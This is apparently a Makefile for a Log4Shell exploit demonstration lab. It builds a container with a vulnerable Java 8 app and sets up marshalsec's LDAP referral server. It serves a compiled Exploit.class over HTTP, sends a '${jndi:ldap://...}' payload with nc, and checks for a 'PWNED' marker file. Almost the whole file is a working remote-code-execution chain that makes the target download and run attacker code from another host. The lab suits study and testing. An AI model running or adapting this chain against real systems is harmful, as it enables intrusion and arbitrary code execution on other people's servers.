.PHONY: build run exploit-setup ldap-server http-server vulnerable-server test-exploit verify clean help start-all stop-all status logs

# Default target
help:
	@echo "Log4Shell Exploit Demo - Makefile Commands"
	@echo "==========================================="
	@echo ""
	@echo "Setup (run once):"
	@echo "  make build              - Build the vulnerable container with Java 8u181"
	@echo "  make exploit-setup      - Build marshalsec and compile exploit"
	@echo ""
	@echo "Quick Start (all servers in background):"
	@echo "  make start-all          - Start all servers (HTTP, LDAP, vulnerable app)"
	@echo "  make status             - Check if servers are running"
	@echo "  make logs               - View server logs (usage: make logs TYPE=http)"
	@echo "  make stop-all           - Stop all background servers"
	@echo ""
	@echo "Manual (requires 3 separate terminals):"
	@echo "  Terminal 1: make http-server        - Start HTTP server (port 8888)"
	@echo "  Terminal 2: make ldap-server        - Start LDAP server (port 1389)"
	@echo "  Terminal 3: make vulnerable-server  - Run vulnerable app (port 8080)"
	@echo ""
	@echo "Execute the exploit:"
	@echo "  make test-exploit       - Send JNDI payload to vulnerable server"
	@echo "  make verify             - Check if exploit succeeded"
	@echo ""
	@echo "Cleanup:"
	@echo "  make clean              - Stop all services and remove containers"
	@echo ""
	@echo "Note: HOST_IP will be auto-detected. Override with: HOST_IP=x.x.x.x make start-all"

# Auto-detect host IP if not set
HOST_IP ?= $(shell hostname -I | awk '{print $$1}')

build:
	podman build -t log4jcve .

run: build
	podman run -ti log4jcve

exploit-setup:
	@echo "Setting up exploit environment..."
	@mkdir -p exploit
	@if [ ! -d exploit/marshalsec ]; then \
		cd exploit && git clone https://github.com/mbechler/marshalsec.git; \
	fi
	@echo "Building marshalsec..."
	@cd exploit/marshalsec && podman run --rm -v $$(pwd):/marshalsec:Z -w /marshalsec maven:3.8.4-jdk-8 mvn clean package -DskipTests
	@echo "Compiling exploit payload..."
	@cd exploit && podman run --rm -v $$(pwd):/exploit:Z maven:3.8.4-jdk-8 javac /exploit/Exploit.java
	@echo "Exploit setup complete!"

http-server:
	@echo "Starting HTTP server on port 8888..."
	@echo "Serving Exploit.class from exploit/ directory"
	cd exploit && python3 -m http.server 8888

ldap-server:
	@echo "Starting LDAP referral server on port 1389..."
	@echo "Host IP: $(HOST_IP)"
	@echo "Redirecting to: http://$(HOST_IP):8888/#Exploit"
	cd exploit/marshalsec && java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar \
		marshalsec.jndi.LDAPRefServer "http://$(HOST_IP):8888/#Exploit" 1389

vulnerable-server:
	@echo "Starting vulnerable server on port 8080..."
	@echo "Using host network to access LDAP server"
	podman run --rm --network=host log4jcve

test-exploit:
	@echo "Sending Log4Shell exploit payload..."
	@echo "Payload: \$${jndi:ldap://$(HOST_IP):1389/Exploit}"
	@echo '\$${jndi:ldap://$(HOST_IP):1389/Exploit}' | nc localhost 8080
	@echo ""
	@echo "Exploit sent! Wait 3 seconds then run 'make verify' to check results"
	@sleep 3

verify:
	@echo "Checking for exploit success..."
	@CONTAINER_ID=$$(podman ps -q --filter ancestor=log4jcve | head -1); \
	if [ -z "$$CONTAINER_ID" ]; then \
		echo "ERROR: No vulnerable container is running!"; \
		echo "Start it with: make vulnerable-server"; \
		exit 1; \
	fi; \
	echo "Container ID: $$CONTAINER_ID"; \
	echo ""; \
	echo "=== Exploit Output ==="; \
	podman exec $$CONTAINER_ID cat /tmp/PWNED_BY_LOG4SHELL.txt 2>/dev/null || echo "Exploit file not found - exploit may have failed"

start-all:
	@./start-servers.sh start

stop-all:
	@./start-servers.sh stop

status:
	@./start-servers.sh status

logs:
	@if [ -z "$(TYPE)" ]; then \
		./start-servers.sh logs; \
	else \
		./start-servers.sh logs $(TYPE); \
	fi

clean:
	@echo "Stopping all services..."
	-./start-servers.sh stop 2>/dev/null || true
	-podman stop $$(podman ps -q --filter ancestor=log4jcve) 2>/dev/null || true
	-pkill -f "python3 -m http.server 8888" 2>/dev/null || true
	-pkill -f "marshalsec.jndi.LDAPRefServer" 2>/dev/null || true
	@echo "Cleanup complete!"